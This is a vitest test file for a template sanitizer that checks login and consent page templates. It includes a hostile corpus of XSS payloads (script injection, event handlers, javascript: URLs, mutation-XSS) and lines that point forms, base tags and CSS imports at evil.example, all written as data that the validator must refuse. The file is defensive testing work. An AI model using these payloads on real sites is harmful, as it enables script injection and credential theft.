import { PAGE_KINDS, type PageKind } from '@odudu/kernel';
import { describe, expect, it } from 'vitest';
import { checkTemplate } from '#/service/template';

// Catches only a catastrophic regression: an uncapped parse costs seconds,
// so 2 s sits far above the capped path and tolerates a loaded runner.
const CATASTROPHIC_MS = 2000;

const SIGN_IN =
  '<div class="card"><h1>{{t "login.title"}}</h1>{{error}}{{form.open}}{{fields}}{{submit}}{{form.close}}</div>';

const codes = (template: string, options?: Parameters<typeof checkTemplate>[2]): string[] =>
  checkTemplate('sign-in', template, options).map((issue) => issue.code);

const refused = (template: string): boolean => checkTemplate('sign-in', template).length > 0;

// A sign-in template that is otherwise valid with `fragment` added to it.
const withFragment = (fragment: string): string => `${SIGN_IN}${fragment}`;

describe('checkTemplate', () => {
  it('accepts a minimal sign-in template', () => {
    expect(checkTemplate('sign-in', SIGN_IN)).toEqual([]);
  });

  it('accepts a template that writes its own page-<kind> class', () => {
    const template = SIGN_IN.replace('class="card"', 'class="page-sign-in"');
    expect(template).toContain('class="page-sign-in"');
    expect(checkTemplate('sign-in', template)).toEqual([]);
  });

  it('accepts optional parts once and the allowed attributes', () => {
    const template = withFragment(
      '<p lang="en" dir="ltr" role="note" aria-label="x" class="a">{{links}}</p>' +
        '<a href="https://example.com/help" rel="noopener noreferrer" class="l">Help</a>',
    );
    expect(checkTemplate('sign-in', template)).toEqual([]);
  });

  it.each([
    'script',
    'style',
    'link',
    'meta',
    'base',
    'iframe',
    'object',
    'embed',
    'form',
    'input',
    'button',
    'select',
    'textarea',
    'svg',
    'math',
    'template',
    'noscript',
    'frame',
    'frameset',
    'applet',
    'portal',
    'dialog',
    'x-widget',
    'details',
    'video',
  ])('refuses <%s>', (tag) => {
    expect(codes(withFragment(`<${tag}></${tag}>`))).toContain('element-not-allowed');
  });

  it('refuses an unrecognised element rather than passing it', () => {
    expect(codes(withFragment('<blink>hi</blink>'))).toEqual(['element-not-allowed']);
  });

  it('refuses an allowed tag name in a foreign namespace', () => {
    expect(codes(withFragment('<svg><a href="https://x.example">x</a></svg>'))).toContain(
      'element-not-allowed',
    );
  });

  it('refuses a slot inside href', () => {
    const template = withFragment('<a href="{{links}}" rel="noopener noreferrer">x</a>');
    expect(codes(template)).toContain('slot-in-attribute');
  });

  it('refuses a slot in any attribute value, name or comment', () => {
    expect(codes(withFragment('<p class="a {{links}}">x</p>'))).toContain('slot-in-attribute');
    expect(codes(withFragment('<p data-{{links}}="1">x</p>'))).toContain('slot-in-attribute');
    expect(codes(withFragment('<!-- {{links}} -->'))).toContain('comment');
  });

  it('refuses on* and style attributes', () => {
    expect(codes(withFragment('<p onclick="x()">a</p>'))).toContain('attribute-not-allowed');
    expect(codes(withFragment('<p ONMOUSEOVER="x()">a</p>'))).toContain('attribute-not-allowed');
    expect(codes(withFragment('<p style="color:red">a</p>'))).toContain('attribute-not-allowed');
    expect(codes(withFragment('<p id="a" title="b" data-x="c">a</p>'))).toEqual([
      'attribute-not-allowed',
      'attribute-not-allowed',
      'attribute-not-allowed',
    ]);
  });

  it('refuses a javascript: and an http: href, accepts https with rel', () => {
    const link = (href: string, rel = ' rel="noopener noreferrer"'): string =>
      withFragment(`<a href="${href}"${rel}>x</a>`);
    expect(codes(link('javascript:alert(1)'))).toContain('href-not-https');
    expect(codes(link('JaVaScRiPt:alert(1)'))).toContain('href-not-https');
    expect(codes(link(' javascript:alert(1)'))).toContain('href-not-https');
    expect(codes(link('java&#9;script:alert(1)'))).toContain('href-not-https');
    expect(codes(link('http://example.com'))).toContain('href-not-https');
    expect(codes(link('/relative'))).toContain('href-not-https');
    expect(codes(link('data:text/html,x'))).toContain('href-not-https');
    expect(codes(link('https://example.com'))).toEqual([]);
    expect(codes(link('HTTPS://example.com'))).toEqual([]);
    expect(codes(link('https://example.com', ''))).toContain('link-rel');
    expect(codes(link('https://example.com', ' rel="noopener"'))).toContain('link-rel');
    expect(codes(withFragment('<a rel="noopener noreferrer">x</a>'))).toContain('href-not-https');
  });

  it('img src must be an asset URL of the theme', () => {
    const img = '<img src="/theme-assets/abc.png" alt="Logo">';
    const isAssetUrl = (url: string): boolean => url.startsWith('/theme-assets/');
    expect(codes(withFragment(img))).toContain('img-src');
    expect(codes(withFragment(img), { isAssetUrl })).toEqual([]);
    expect(
      codes(withFragment('<img src="https://evil.example/x.png" alt="x">'), { isAssetUrl }),
    ).toContain('img-src');
    expect(codes(withFragment('<img src="/theme-assets/abc.png">'), { isAssetUrl })).toContain(
      'img-alt',
    );
    expect(codes(withFragment('<img alt="x">'), { isAssetUrl })).toContain('img-src');
    expect(
      codes(withFragment('<img src="/theme-assets/a.png" alt="" srcset="x 1x">'), { isAssetUrl }),
    ).toContain('attribute-not-allowed');
  });

  it('refuses a missing required part and a doubled one', () => {
    expect(codes('<p>{{t "x"}}</p>')).toEqual([
      'missing-part',
      'missing-part',
      'missing-part',
      'missing-part',
      'missing-part',
    ]);
    expect(codes(withFragment('{{submit}}'))).toEqual(['form-placement', 'repeated-part']);
    expect(codes(withFragment('{{links}}{{links}}'))).toEqual(['repeated-part']);
  });

  it('refuses an unknown slot, a slot of another kind and a malformed one', () => {
    expect(codes(withFragment('{{nope}}'))).toEqual(['unknown-slot']);
    expect(codes(withFragment('{{submit.allow}}'))).toEqual(['unknown-slot']);
    expect(codes(withFragment('{{ links }}'))).toContain('malformed-slot');
    expect(codes(withFragment('{{t foo}}'))).toContain('malformed-slot');
    expect(codes(withFragment('}}'))).toContain('malformed-slot');
  });

  it('refuses a message key the page catalogue lacks when told which it holds', () => {
    const template = SIGN_IN.replace('login.title', 'login.nonesuch');
    const options = { isMessageKey: (key: string) => key === 'login.title' };
    expect(codes(SIGN_IN, options)).toEqual([]);
    expect(codes(template, options)).toEqual(['unknown-message-key']);
    const [issue] = checkTemplate('sign-in', template, options);
    expect(issue).toMatchObject({ detail: 'login.nonesuch', line: 1, column: 23 });
    // Without the option a key is not looked up, as at render time.
    expect(codes(template)).toEqual([]);
  });

  it('refuses a slot inside a raw-text element', () => {
    for (const tag of ['title', 'textarea', 'style', 'script', 'noscript', 'xmp', 'iframe']) {
      expect(codes(withFragment(`<${tag}>{{links}}</${tag}>`)), tag).toContain('slot-in-raw-text');
    }
  });

  it('refuses a slot inside a raw-text element of the svg namespace', () => {
    for (const tag of ['style', 'script', 'title']) {
      expect(codes(withFragment(`<svg><${tag}>{{links}}</${tag}></svg>`)), tag).toContain(
        'slot-in-raw-text',
      );
    }
  });

  it('refuses an entity-encoded slot', () => {
    expect(codes(withFragment('<p>&#123;&#123;error&#125;&#125;</p>'))).not.toEqual([]);
    expect(codes(withFragment('<p>&lbrace;&lbrace;error&rbrace;&rbrace;</p>'))).not.toEqual([]);
    expect(codes(withFragment('<p class="&#123;&#123;error&#125;&#125;">a</p>'))).toContain(
      'slot-in-attribute',
    );
  });

  it('refuses a slot split across nodes', () => {
    expect(codes(withFragment('<p>{{err<b>or}}</p>'))).toContain('malformed-slot');
  });

  it('rejects over-size and over-slot-count', () => {
    expect(codes(`${SIGN_IN}${'<p>x</p>'.repeat(10_000)}`)).toEqual(['too-large']);
    const many = `${SIGN_IN}${'{{t "a.b"}}'.repeat(200)}`;
    expect(codes(many)).toEqual(['too-many-slots']);
    expect(codes(`${SIGN_IN}${'{{t "a.b"}}'.repeat(190)}`)).toEqual([]);
  });

  it('checks the manifest of the kind it is given', () => {
    const consent =
      '{{form.open}}{{client}}{{scopes}}{{submit.allow}}{{submit.deny}}{{form.close}}{{error}}';
    expect(checkTemplate('consent', consent)).toEqual([]);
    expect(checkTemplate('sign-in', consent).map((issue) => issue.code)).toContain('unknown-slot');
  });

  it('accepts a correct template for every kind', () => {
    for (const [kind, manifest] of Object.entries(PAGE_KINDS)) {
      const parts = manifest.required.filter((name) => !name.startsWith('form.'));
      const outside = parts.filter((name) => !manifest.inForm.includes(name));
      const inside = parts.filter((name) => manifest.inForm.includes(name));
      const hasForm = manifest.required.includes('form.open');
      const template =
        outside.map((name) => `<p>{{${name}}}</p>`).join('') +
        (hasForm ? '<div>{{form.open}}' : '') +
        inside.map((name) => `<p>{{${name}}}</p>`).join('') +
        (hasForm ? '{{form.close}}</div>' : '');
      expect(checkTemplate(kind as PageKind, template), kind).toEqual([]);
    }
  });
});

describe('form pair', () => {
  const codesFor = (template: string): string[] =>
    checkTemplate('sign-in', template).map((issue) => issue.code);

  it('refuses a reversed pair', () => {
    expect(codesFor('{{form.close}}{{fields}}{{submit}}{{form.open}}')).toContain('form-pair');
  });

  it('refuses a missing close, a doubled open and a required part outside the pair', () => {
    expect(codesFor('{{error}}{{form.open}}{{fields}}{{submit}}')).toContain('missing-part');
    expect(codesFor('{{form.open}}{{form.open}}{{fields}}{{submit}}{{form.close}}')).toContain(
      'form-pair',
    );
    expect(codesFor('{{error}}{{fields}}{{form.open}}{{submit}}{{form.close}}')).toEqual([
      'form-placement',
    ]);
    expect(codesFor('{{error}}{{form.open}}{{fields}}{{form.close}}{{submit}}')).toEqual([
      'form-placement',
    ]);
  });

  it('refuses one half of a form pair and an in-form part without the pair', () => {
    const issuesVerification = (template: string): string[] =>
      checkTemplate('verification', template).map((issue) => `${issue.code}:${issue.detail}`);
    expect(issuesVerification('{{message}}{{form.open}}{{submit}}{{form.close}}')).toEqual([]);
    expect(issuesVerification('{{message}}')).toEqual(
      expect.arrayContaining(['missing-part:form.open', 'missing-part:submit']),
    );
    const codes = (template: string): string[] =>
      checkTemplate('verification', template).map((issue) => issue.code);
    expect(codes('{{message}}{{form.open}}{{submit}}')).toContain('form-pair');
    expect(codes('{{message}}{{form.close}}')).toContain('form-pair');
    expect(codes('{{message}}{{submit}}')).toContain('form-placement');
  });
});

describe('what the parser would drop or never reach', () => {
  const codesFor = (fragment: string): string[] =>
    checkTemplate('sign-in', `${SIGN_IN}${fragment}`).map((issue) => issue.code);

  it('refuses an unterminated tag, which would swallow the markup after the template', () => {
    expect(codesFor('<a href="https://evil.example/?')).toContain('unterminated');
    expect(codesFor('<img src="https://evil.example/?')).toContain('unterminated');
    expect(codesFor('<p')).toContain('unterminated');
    expect(codesFor('<!-- open')).not.toEqual([]);
  });

  it('refuses table parts outside a table, whatever their attributes', () => {
    for (const tag of ['td', 'tr', 'th', 'tbody', 'thead', 'tfoot', 'caption']) {
      expect(codesFor(`<${tag} onclick="alert(1)">x</${tag}>`), tag).toContain('unparsed-tag');
      expect(codesFor(`<${tag}>x</${tag}>`), tag).toContain('unparsed-tag');
    }
  });

  it('inspects table parts inside a table', () => {
    expect(codesFor('<table><tr><td onclick="x">a</td></tr></table>')).toContain(
      'attribute-not-allowed',
    );
    expect(codesFor('<table><tbody><tr><th style="x">a</th></tr></tbody></table>')).toContain(
      'attribute-not-allowed',
    );
    expect(codesFor('<table><caption>c</caption><tr><td>a</td></tr></table>')).toEqual([]);
  });
});

describe('dropped tags and implied elements', () => {
  const required = (template: string): string[] =>
    checkTemplate('required-action', template).map((issue) => issue.code);

  it('refuses a tbody or tr the parser drops after a table that implied its own', () => {
    expect(required('{{message}}<table><td>x</td></table><tbody onclick=alert(1)>')).toContain(
      'unparsed-tag',
    );
    expect(required('{{message}}<table><td>x</td></table><tr onclick=alert(1)>')).toContain(
      'unparsed-tag',
    );
  });

  it('inspects a tbody or tr inside a real table and accepts one without attributes', () => {
    expect(
      required('{{message}}<table><tbody onclick="x"><tr><td>a</td></tr></tbody></table>'),
    ).toContain('attribute-not-allowed');
    expect(required('{{message}}<table><tr onclick="x"><td>a</td></tr></table>')).toContain(
      'attribute-not-allowed',
    );
    expect(required('{{message}}<table><tr><td>x</td></tr></table>')).toEqual([]);
    expect(required('{{message}}<table><tbody><tr><td>x</td></tr></tbody></table>')).toEqual([]);
  });
});

describe('elements left open', () => {
  const required = (template: string): string[] =>
    checkTemplate('required-action', template).map((issue) => issue.code);

  it('refuses an element that would wrap what the server emits next', () => {
    for (const open of [
      '<div>x',
      '<span>x',
      '<a href="https://x.example" rel="noopener noreferrer">x',
      '<table><tr><td>x',
    ]) {
      expect(required(`{{message}}${open}`), open).toContain('unclosed-element');
    }
  });

  it('accepts what HTML lets a template leave open', () => {
    for (const open of ['<p>x', '<ul><li>a<li>b</ul>', '<p>a<br>b', '<table><tr><td>x</table>']) {
      expect(required(`{{message}}${open}`), open).toEqual([]);
    }
  });
});

describe('bounds before the parser', () => {
  const required = (template: string): { codes: string[]; ms: number } => {
    const started = performance.now();
    const codes = checkTemplate('required-action', template).map((issue) => issue.code);
    return { codes, ms: performance.now() - started };
  };

  it.each([
    ['stray </b> ends', '<div></b>'.repeat(1000)],
    ['stray </span> ends', '<div></span>'.repeat(1000)],
    ['adoption agency with stray ends', '<b><p></b></span>'.repeat(1000)],
    ['mismatched closers at the element cap', '<div>'.repeat(1990) + '</b>'.repeat(1990)],
  ])('refuses nesting hidden by %s', (_name, markup) => {
    const { codes, ms } = required(`{{message}}${markup}`);
    expect(codes).toContain('too-deep');
    expect(ms).toBeLessThan(CATASTROPHIC_MS);
  });

  it('refuses <table><td> x16, which only the tree depth sees', () => {
    const { codes, ms } = required(`{{message}}${'<table><td>'.repeat(16)}`);
    expect(codes).toContain('too-deep');
    expect(ms).toBeLessThan(CATASTROPHIC_MS);
  });

  it('is estimated shallower than the tree for some inputs, which are still accepted', () => {
    expect(required('{{message}}<b></p></b>').codes).toEqual([]);
    expect(required('{{message}}<ul><li><br></ul>').codes).toEqual([]);
  });

  it('counts elements the parser makes from stray end tags', () => {
    const { codes, ms } = required(`{{message}}${'</p>'.repeat(5_000)}`);
    expect(codes).toContain('too-many-elements');
    expect(ms).toBeLessThan(CATASTROPHIC_MS);
  });

  it('refuses properly closed nesting past the cap', () => {
    const nested = `{{message}}${'<div>'.repeat(40)}${'</div>'.repeat(40)}`;
    expect(required(nested).codes).toContain('too-deep');
  });

  const timed = (template: string): { codes: string[]; ms: number } => {
    const started = performance.now();
    const codes = checkTemplate('sign-in', template).map((issue) => issue.code);
    return { codes, ms: performance.now() - started };
  };

  it('refuses 12,000 nested divs quickly', () => {
    const { codes, ms } = timed(`${SIGN_IN}${'<div>'.repeat(12_000)}`);
    expect(codes).toContain('too-deep');
    expect(ms).toBeLessThan(CATASTROPHIC_MS);
  });

  it('refuses 21,000 unclosed <b> quickly', () => {
    const { codes, ms } = timed(`${SIGN_IN}${'<b>'.repeat(21_000)}`);
    expect(codes).toContain('too-deep');
    expect(ms).toBeLessThan(CATASTROPHIC_MS);
  });

  it('refuses too many elements and accepts a deep but legal template', () => {
    expect(timed(`${SIGN_IN}${'<b></b>'.repeat(2_100)}`).codes).toContain('too-many-elements');
    const deep = `${'<div>'.repeat(30)}x${'</div>'.repeat(30)}`;
    expect(checkTemplate('sign-in', `${SIGN_IN}${deep}`)).toEqual([]);
  });
});

const payloads: string[] = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<img src="x" onerror="alert(1)" alt="x">',
  '<a href="JaVaScRiPt:alert(1)" rel="noopener noreferrer">x</a>',
  '<a href="&#106;avascript:alert(1)" rel="noopener noreferrer">x</a>',
  '<a href="vbscript:msgbox(1)" rel="noopener noreferrer">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD4=" rel="noopener noreferrer">x</a>',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><style>@import url(//evil.example/x.css)</style></svg>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<form action="https://evil.example"><input name="password"></form>',
  '<form><form><input></form></form>',
  '<base href="https://evil.example/">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<style>@import "//evil.example/x.css";</style>',
  '<p style="width:expression(alert(1))">x</p>',
  '<p style="background:url(javascript:alert(1))">x</p>',
  '<iframe src="https://evil.example"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="x.swf"></object>',
  '<embed src="x.swf">',
  '<button formaction="https://evil.example">x</button>',
  '<input type="image" src="x" onerror="alert(1)">',
  '<select><option>x</option></select>',
  '<textarea>x</textarea>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>',
  '<p><svg><style><a id="</style><img src=x onerror=alert(1)>"></p>',
  '<template><script>alert(1)</script></template>',
  '<details open ontoggle=alert(1)>x</details>',
  '<div onpointerenter="alert(1)">x</div>',
  '<x-evil onclick="alert(1)">x</x-evil>',
  '<p><a href="https://example.com" onclick="alert(1)" rel="noopener noreferrer">x</a></p>',
  '<a href="https://example.com">no rel</a>',
  '<a href="https://example.com" target="_blank" rel="noopener noreferrer">x</a>',
  '<!--[if IE]><script>alert(1)</script><![endif]-->',
  '<![CDATA[<script>alert(1)</script>]]>',
  '<plaintext>x',
  '<xmp><script>alert(1)</script></xmp>',
  '<marquee onstart=alert(1)>x</marquee>',
  '<video><source onerror=alert(1)></video>',
  '<table background="javascript:alert(1)"><tr><td>x</td></tr></table>',
  '<div id="x" class="y">clobber</div>',
  '<img src="https://evil.example/pixel.gif" alt="">',
  '<p>{{script}}</p>',
  '<p class="{{links}}">x</p>',
  '<p>&#60;script&#62;</p><script>x</script>',
];

describe('hostile corpus', () => {
  it('has at least 25 payloads', () => {
    expect(payloads.length).toBeGreaterThanOrEqual(25);
  });

  it.each(payloads)('refuses %s', (payload) => {
    expect(refused(withFragment(payload))).toBe(true);
  });
});

describe('issue positions', () => {
  const at = (template: string): { code: string; line: number | null; column: number | null }[] =>
    checkTemplate('sign-in', template).map(({ code, line, column }) => ({ code, line, column }));

  it('points at the tag of a refused attribute', () => {
    const template = `${SIGN_IN}\n<section>\n    <div onclick=x>a</div>\n</section>`;
    expect(at(template)).toEqual([{ code: 'attribute-not-allowed', line: 3, column: 5 }]);
  });

  it('points at an element with no end tag in the source', () => {
    const template = `${SIGN_IN}\n<span>x`;
    expect(at(template)).toEqual([{ code: 'unclosed-element', line: 2, column: 1 }]);
    const detail = checkTemplate('sign-in', template)[0]?.detail;
    expect(detail).toBe('span has no end tag in the source');
  });

  it('points at the second occurrence of a repeated part', () => {
    const template = `{{error}}{{form.open}}{{fields}}\n{{submit}}\n  {{submit}}{{form.close}}`;
    expect(at(template)).toEqual([{ code: 'repeated-part', line: 3, column: 3 }]);
  });

  it('points at an unknown slot and at a dropped tag', () => {
    expect(at(`${SIGN_IN}\n{{nope}}`)).toEqual([{ code: 'unknown-slot', line: 2, column: 1 }]);
    expect(at(`${SIGN_IN}\n\n  <frame>`)[0]).toEqual({
      code: 'element-not-allowed',
      line: 3,
      column: 3,
    });
  });

  it('has no position where there is no single place', () => {
    expect(at('a'.repeat(70_000))).toEqual([{ code: 'too-large', line: null, column: null }]);
    expect(at('<p>x</p>').map(({ line }) => line)).toEqual([null, null, null, null, null]);
  });

  it('keeps every position in the corpus inside the template', () => {
    for (const payload of payloads) {
      const template = `${SIGN_IN}\n${payload}`;
      const lines = template.split('\n').length;
      for (const { line, column } of checkTemplate('sign-in', template)) {
        if (line === null) {
          expect(column).toBeNull();
        } else {
          expect(line).toBeGreaterThanOrEqual(1);
          expect(line).toBeLessThanOrEqual(lines);
          expect(column).toBeGreaterThanOrEqual(1);
        }
      }
    }
  });
});

describe('issue positions, in awkward text', () => {
  const where = (template: string, code: string): { line: number | null; column: number | null } =>
    checkTemplate('sign-in', template)
      .filter((issue) => issue.code === code)
      .map(({ line, column }) => ({ line, column }))[0] ?? { line: -1, column: -1 };

  it('counts a carriage return as a character and only a line feed as a break', () => {
    expect(where(`${SIGN_IN}\r\n<p onclick=x>a</p>`, 'attribute-not-allowed')).toEqual({
      line: 2,
      column: 1,
    });
    expect(where(`${SIGN_IN}\r\n\r\n  <p onclick=x>a</p>`, 'attribute-not-allowed')).toEqual({
      line: 3,
      column: 3,
    });
  });

  it('counts a tab as one column', () => {
    expect(where(`${SIGN_IN}\n\t\t<p onclick=x>a</p>`, 'attribute-not-allowed')).toEqual({
      line: 2,
      column: 3,
    });
  });

  it('counts a leading byte order mark as a column of its own', () => {
    const template = `﻿${SIGN_IN}\n<p onclick=x>a</p>`;
    expect(where(template, 'attribute-not-allowed')).toEqual({ line: 2, column: 1 });
    const same = `﻿${SIGN_IN}<p onclick=x>a</p>`;
    expect(where(same, 'attribute-not-allowed').column).toBe(same.indexOf('<p onclick') + 1);
  });

  it('counts an astral character as two UTF-16 units', () => {
    expect(where(`${SIGN_IN}\n\u{1F600}<p onclick=x>a</p>`, 'attribute-not-allowed')).toEqual({
      line: 2,
      column: 3,
    });
  });

  it('places a slot written in an attribute on the line it is on', () => {
    const template = `${SIGN_IN}\n\n\n<p class="{{links}}">x</p>`;
    const issue = checkTemplate('sign-in', template).find((found) => found.line !== null);
    expect(issue?.line).toBe(4);
  });

  it('answers the same issues, in the same order, every time', () => {
    const template = `${SIGN_IN}\n<frame>\n<p onclick=x>a</p>\n<span>\n{{nope}}`;
    expect(checkTemplate('sign-in', template)).toEqual(checkTemplate('sign-in', template));
  });
});

describe('the issue cap', () => {
  it('stops listing repeats but still names a kind of problem it has not listed', () => {
    const noise = Array.from({ length: 150 }, (_, n) => `<e${String(n)}></e${String(n)}>`).join('');
    const found = checkTemplate('sign-in', `${SIGN_IN}${noise}<p onclick=x>a</p>`);
    const kinds = new Set(found.map((issue) => issue.code));
    expect(found.filter((issue) => issue.code === 'element-not-allowed')).toHaveLength(100);
    expect(kinds.has('attribute-not-allowed')).toBe(true);
    expect(found.length).toBeLessThanOrEqual(100 + kinds.size);
  });
});

describe('an unterminated construct', () => {
  it('is placed where the construct starts, not at the end of the template', () => {
    const template = `${SIGN_IN}\n<a href="https://evil.example/?`;
    const issue = checkTemplate('sign-in', template).find((found) => found.code === 'unterminated');
    expect(issue).toMatchObject({ line: 2, column: 1 });
  });
});
